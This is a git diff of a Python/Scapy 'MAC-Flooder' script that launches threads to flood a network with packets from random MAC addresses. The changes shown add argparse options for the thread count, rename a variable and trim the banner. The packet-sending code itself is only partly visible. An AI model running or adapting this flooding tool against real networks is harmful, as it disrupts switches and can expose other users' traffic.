@@ -2,6 +2,7 @@ from scapy.all import *
 from time import sleep
 import random
 import threading
+import argparse
 
 threads = 4
 answ = False
@@ -15,8 +16,8 @@ def perform_query():
         print(f"Sent packet: {count}")
 
 def getRandomMAC():
-    genIP = f"{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}"
-    return genIP
+    genMAC = f"{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}"
+    return genMAC
 
 def flood(): 
     perform_query()
@@ -26,19 +27,18 @@ def startThreads():
         t = threading.Thread(target=flood)
         t.start()
 
-print("MAC-Flooder v0.0.1 - by k1f0")
-sleep(1)
-print("RUN THIS SCRIPT AS ROOT OR IT WILL NOT WORK!")
+print("RUN AS ROOT!")
 sleep(1)
 
-userThreads = input(f"Specify Threads to use (def {threads}): ")
+parser = argparse.ArgumentParser(prog="main.py", usage='%(prog)s [options]',description='Simple MAC-Flooder using Scapy')
+parser.add_argument('-t', metavar='N', type=int, nargs='+', help='threads to use')
+args = parser.parse_args()
 
-if userThreads == '':
-    print(f"Using Default Threads count of {threads}")
-    sleep(0.5)
+if args.t == None:
+    print("No arguments specified!")
+    print('Hint: use "-h" to get help')
 else:
-    print(f"Using Threads count of {userThreads}")
-    threads = int(userThreads)
-    sleep(0.5)
-
-startThreads()
+    threads = int(args.t[0])
+    print(f"Using thread count of: {threads}")
+    sleep(1)
+    startThreads()
